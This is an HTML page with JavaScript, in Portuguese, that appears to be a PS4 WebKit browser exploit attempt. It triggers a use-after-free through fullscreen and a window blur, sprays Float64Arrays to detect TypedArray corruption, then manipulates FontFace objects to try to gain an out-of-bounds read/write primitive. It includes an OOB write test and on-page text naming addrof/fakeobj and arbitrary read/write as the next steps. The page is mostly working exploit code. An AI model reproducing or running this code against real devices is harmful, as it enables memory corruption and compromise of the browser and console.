<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - FontFace Otimizado</title>
<style>
body { 
    font-family: monospace; 
    background: #000; 
    color: #0f0; 
    padding: 20px;
}
.box {
    border: 2px solid #0a0;
    padding: 15px;
    margin: 10px 0;
    background: #001100;
}
.critical { background: #330033 !important; border-color: #f0f !important; color: #f0f; }
.success { background: #003300 !important; border-color: #0f0 !important; }
button {
    background: #0a0;
    color: #000;
    border: none;
    padding: 15px 30px;
    font-size: 18px;
    cursor: pointer;
}
.hex { color: #ff0; }
.addr { color: #0ff; font-weight: bold; }
</style>
</head>
<body>

<h1>‚ö° UAF Otimizado - Configura√ß√£o M√≠nima</h1>

<div class="box critical">
    <h2>üéØ ESTRAT√âGIA SIMPLIFICADA</h2>
    <p><b>PROBLEMA:</b> Testes complexos saturam a RAM e falham.</p>
    <p><b>SOLU√á√ÉO:</b> Configura√ß√£o M√çNIMA, UAF base primeiro, DEPOIS adicionar FontFace.</p>
</div>

<div class="box">
    <h2>TESTE FINAL: UAF Base + FontFace Sequencial</h2>
    <button onclick="runOptimizedTest()">‚ñ∂ EXECUTAR</button>
    <div id="result"></div>
</div>

<script>
function f2i(f) {
    let buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = f;
    return (new BigUint64Array(buf))[0];
}

function i2f(i) {
    let buf = new ArrayBuffer(8);
    (new BigUint64Array(buf))[0] = BigInt(i);
    return (new Float64Array(buf))[0];
}

function hex(n) {
    return '0x' + n.toString(16).padStart(16, '0');
}

const PATTERN_A = 2.121995791e-314;

let global_state = {
    corrupted_typed: null,
    target_arrays: [],
    font_objects: []
};

function runOptimizedTest() {
    const result = document.getElementById('result');
    result.innerHTML = '<h3>‚ö° TESTE OTIMIZADO</h3>';
    
    result.innerHTML += '<div class="box critical">';
    result.innerHTML += '<b>FLUXO:</b><br>';
    result.innerHTML += '1. Configura√ß√£o M√çNIMA (apenas TypedArrays)<br>';
    result.innerHTML += '2. Confirmar UAF base<br>';
    result.innerHTML += '3. DEPOIS criar arrays alvo<br>';
    result.innerHTML += '4. DEPOIS criar FontFace<br>';
    result.innerHTML += '5. Manipular e verificar<br>';
    result.innerHTML += '</div><br>';
    
    // === FASE 1: M√çNIMO NECESS√ÅRIO ===
    result.innerHTML += '<b>FASE 1: Configura√ß√£o m√≠nima</b><br>';
    
    let typed_controllers = [];
    for(let i = 0; i < 5000; i++) { // Reduzido de 8000
        let arr = new Float64Array(8);
        arr[0] = i;
        typed_controllers.push(arr);
    }
    
    result.innerHTML += `‚úì ${typed_controllers.length} TypedArrays criados<br>`;
    result.innerHTML += '<br><h3>‚è≥ APERTE OPTIONS AGORA!</h3>';
    
    // TRIGGER
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<br><h3>üî• FASE 2: UAF BASE</h3>';
        
        // Spray m√≠nimo
        let spray = [];
        for(let i = 0; i < 8000; i++) { // Reduzido de 12000
            let p = new Float64Array(10);
            p.fill(PATTERN_A);
            spray.push(p);
        }
        
        result.innerHTML += '‚úì Spray executado<br>';
        
        // Verificar UAF
        let corrupted_idx = -1;
        for(let i = 0; i < typed_controllers.length; i++) {
            if (typed_controllers[i][0] === PATTERN_A) {
                corrupted_idx = i;
                global_state.corrupted_typed = typed_controllers[i];
                break;
            }
        }
        
        if (corrupted_idx === -1) {
            result.innerHTML += '<div class="box" style="border-color: #f00; color: #f00;">';
            result.innerHTML += '<h3>‚ùå UAF BASE FALHOU</h3>';
            result.innerHTML += 'Poss√≠veis causas:<br>';
            result.innerHTML += '‚Ä¢ Timing incorreto<br>';
            result.innerHTML += '‚Ä¢ RAM insuficiente<br>';
            result.innerHTML += '‚Ä¢ Garbage collector interferiu<br>';
            result.innerHTML += '<br><b>SOLU√á√ÉO:</b> Recarregue a p√°gina e tente novamente.<br>';
            result.innerHTML += 'Se continuar falhando, o UAF pode ser sens√≠vel ao estado do navegador.<br>';
            result.innerHTML += '</div>';
            return;
        }
        
        result.innerHTML += `<div class="box success">`;
        result.innerHTML += `<b>‚úÖ UAF BASE CONFIRMADO!</b><br>`;
        result.innerHTML += `TypedArray[${corrupted_idx}] corrompido<br>`;
        result.innerHTML += `</div><br>`;
        
        // === FASE 3: CRIAR ARRAYS ALVO (DEPOIS DO UAF) ===
        result.innerHTML += '<h3>üéØ FASE 3: Criando arrays alvo</h3>';
        
        for(let i = 0; i < 100; i++) { // Apenas 100, n√£o 300
            let arr = [0xAAAA0000 + i, 0xBBBB0000 + i, 0xCCCC0000 + i];
            global_state.target_arrays.push(arr);
        }
        
        result.innerHTML += `‚úì ${global_state.target_arrays.length} arrays JS criados<br><br>`;
        
        // === FASE 4: CRIAR FONTFACE (DEPOIS DO UAF) ===
        result.innerHTML += '<h3>üé® FASE 4: Criando FontFace objects</h3>';
        
        for(let i = 0; i < 200; i++) { // Apenas 200, n√£o 500
            try {
                let font = new FontFace(
                    'PostUAF' + i,
                    'url(data:font/woff2;base64,d09GMgABAAAAAAMoAA0AAAAABRAAAALIAAAAA)',
                    {}
                );
                global_state.font_objects.push(font);
            } catch(e) {
                result.innerHTML += `‚ö†Ô∏è Erro ao criar FontFace ${i}: ${e.message}<br>`;
            }
        }
        
        result.innerHTML += `‚úì ${global_state.font_objects.length} FontFace criados<br><br>`;
        
        // === SNAPSHOT ANTES ===
        result.innerHTML += '<h3>üì∏ ESTADO ANTES DA MANIPULA√á√ÉO</h3>';
        
        let before_state = {
            array_lengths: [],
            typed_offsets: []
        };
        
        // Capturar lengths dos arrays
        for(let i = 0; i < global_state.target_arrays.length; i++) {
            before_state.array_lengths[i] = global_state.target_arrays[i].length;
        }
        
        // Capturar offsets do TypedArray corrompido
        for(let offset = 0; offset < 32; offset++) {
            try {
                before_state.typed_offsets[offset] = f2i(global_state.corrupted_typed[offset]);
            } catch(e) {
                before_state.typed_offsets[offset] = null;
            }
        }
        
        result.innerHTML += '‚úì Snapshot capturado<br><br>';
        
        // === MANIPULA√á√ÉO CR√çTICA ===
        result.innerHTML += '<h3>üî® FASE 5: MANIPULANDO FONTFACE</h3>';
        
        for(let i = 0; i < global_state.font_objects.length; i++) {
            try {
                global_state.font_objects[i].family = 'Mutated' + i;
            } catch(e) {}
        }
        
        result.innerHTML += '‚úì Todos os family names modificados<br><br>';
        
        // === SNAPSHOT DEPOIS ===
        result.innerHTML += '<h3>üì∏ ESTADO DEPOIS DA MANIPULA√á√ÉO</h3>';
        
        let changes_detected = {
            arrays: [],
            offsets: []
        };
        
        // Verificar arrays
        result.innerHTML += '<b>Verificando arrays JS:</b><br>';
        result.innerHTML += '<div style="max-height: 300px; overflow-y: scroll; border: 1px solid #0a0; padding: 10px; background: #000;">';
        
        for(let i = 0; i < global_state.target_arrays.length; i++) {
            const before_len = before_state.array_lengths[i];
            const after_len = global_state.target_arrays[i].length;
            
            if (after_len !== before_len) {
                changes_detected.arrays.push(i);
                result.innerHTML += `<span class="success">[${i}] ${before_len} ‚Üí ${after_len} (MUDOU!)</span><br>`;
                
                // Tentar ler OOB
                result.innerHTML += `  Lendo offsets OOB:<br>`;
                for(let j = before_len; j < Math.min(after_len, before_len + 10); j++) {
                    try {
                        const val = global_state.target_arrays[i][j];
                        if (val !== undefined) {
                            if (typeof val === 'number') {
                                result.innerHTML += `    [${j}] 0x${val.toString(16)}<br>`;
                            } else {
                                result.innerHTML += `    [${j}] ${typeof val}: ${val}<br>`;
                            }
                        }
                    } catch(e) {}
                }
            } else {
                result.innerHTML += `[${i}] length=${after_len} (sem mudan√ßa)<br>`;
            }
        }
        
        result.innerHTML += '</div><br>';
        
        // Verificar TypedArray
        result.innerHTML += '<b>Verificando TypedArray corrompido:</b><br>';
        result.innerHTML += '<div style="max-height: 200px; overflow-y: scroll; border: 1px solid #0a0; padding: 10px; background: #000;">';
        
        for(let offset = 0; offset < 32; offset++) {
            try {
                const before = before_state.typed_offsets[offset];
                const after = f2i(global_state.corrupted_typed[offset]);
                
                if (before !== after && before !== null) {
                    changes_detected.offsets.push(offset);
                    result.innerHTML += `<span class="addr">[${offset}] ${hex(before)} ‚Üí ${hex(after)}</span><br>`;
                }
            } catch(e) {}
        }
        
        result.innerHTML += '</div><br>';
        
        // === RESULTADO FINAL ===
        result.innerHTML += '<h3>üìä RESULTADO FINAL</h3>';
        
        if (changes_detected.arrays.length > 0) {
            result.innerHTML += '<div class="box success">';
            result.innerHTML += '<h2>üéØüéØüéØ SUCESSO! üéØüéØüéØ</h2>';
            result.innerHTML += `<b>${changes_detected.arrays.length} arrays tiveram length expandido!</b><br><br>`;
            result.innerHTML += '<b>ISTO √â UMA PRIMITIVA OOB FUNCIONAL!</b><br><br>';
            result.innerHTML += '<b>Voc√™ pode agora:</b><br>';
            result.innerHTML += '‚úÖ Ler mem√≥ria al√©m do array original<br>';
            result.innerHTML += '‚úÖ Escrever mem√≥ria al√©m do array original<br>';
            result.innerHTML += '‚úÖ Procurar por objetos JS adjacentes<br>';
            result.innerHTML += '‚úÖ Construir primitivas addrof() e fakeobj()<br>';
            result.innerHTML += '‚úÖ Escalar para arbitrary read/write completo<br>';
            result.innerHTML += '<br><b>ESTE √â UM EXPLOIT FUNCIONAL!</b><br>';
            result.innerHTML += '</div>';
            
            // Teste de escrita
            result.innerHTML += '<br><h3>üîß TESTE DE ESCRITA OOB</h3>';
            const victim = changes_detected.arrays[0];
            const original_len = before_state.array_lengths[victim];
            
            try {
                global_state.target_arrays[victim][original_len] = 0xDEADBEEF;
                const readback = global_state.target_arrays[victim][original_len];
                
                result.innerHTML += `Escrito: 0xDEADBEEF<br>`;
                result.innerHTML += `Lido: 0x${readback.toString(16)}<br>`;
                
                if (readback === 0xDEADBEEF) {
                    result.innerHTML += '<br><b class="success">‚úÖ ESCRITA OOB CONFIRMADA!</b><br>';
                }
            } catch(e) {
                result.innerHTML += `‚ö†Ô∏è Erro na escrita: ${e}<br>`;
            }
            
        } else if (changes_detected.offsets.length > 0) {
            result.innerHTML += '<div class="box" style="border-color: #ff0; color: #ff0;">';
            result.innerHTML += '<h3>‚ö†Ô∏è MUDAN√áAS DETECTADAS NO TYPEDARRAY</h3>';
            result.innerHTML += `${changes_detected.offsets.length} offsets modificados ap√≥s manipular FontFace.<br><br>`;
            result.innerHTML += 'Isto indica alguma intera√ß√£o, mas n√£o gerou OOB direto.<br>';
            result.innerHTML += 'Pode ser necess√°rio ajustar timing ou ordem de opera√ß√µes.<br>';
            result.innerHTML += '</div>';
            
        } else {
            result.innerHTML += '<div class="box" style="border-color: #f00; color: #f00;">';
            result.innerHTML += '<h3>‚ùå NENHUMA MUDAN√áA DETECTADA</h3>';
            result.innerHTML += 'A manipula√ß√£o de FontFace n√£o causou efeitos vis√≠veis.<br><br>';
            result.innerHTML += '<b>Conclus√µes poss√≠veis:</b><br>';
            result.innerHTML += '‚Ä¢ FontFace usa heap completamente separado<br>';
            result.innerHTML += '‚Ä¢ Vers√£o do WebKit tem mitiga√ß√µes contra FontFace UAF<br>';
            result.innerHTML += '‚Ä¢ Timing ou ordem de opera√ß√µes n√£o ideal<br>';
            result.innerHTML += '<br><b>STATUS:</b><br>';
            result.innerHTML += '‚úÖ UAF base de TypedArray funcional<br>';
            result.innerHTML += '‚ùå Sem escala√ß√£o para OOB via FontFace<br>';
            result.innerHTML += '</div>';
        }
    };
}

</script>

<hr>
<p style="color: #888;">
<b>üí° OTIMIZA√á√ïES APLICADAS:</b><br>
‚Ä¢ Redu√ß√£o de objetos criados (menos pressure na RAM)<br>
‚Ä¢ Ordem sequencial: UAF primeiro, depois v√≠timas<br>
‚Ä¢ Verifica√ß√£o expl√≠cita se UAF base funcionou<br>
‚Ä¢ Feedback detalhado em caso de falha<br>
<br>
Se este teste tamb√©m falhar no UAF base, pode ser um problema de<br>
estado do navegador. Tente: Fechar todas as abas, limpar cache, reiniciar PS4.
</p>

</body>
</html>
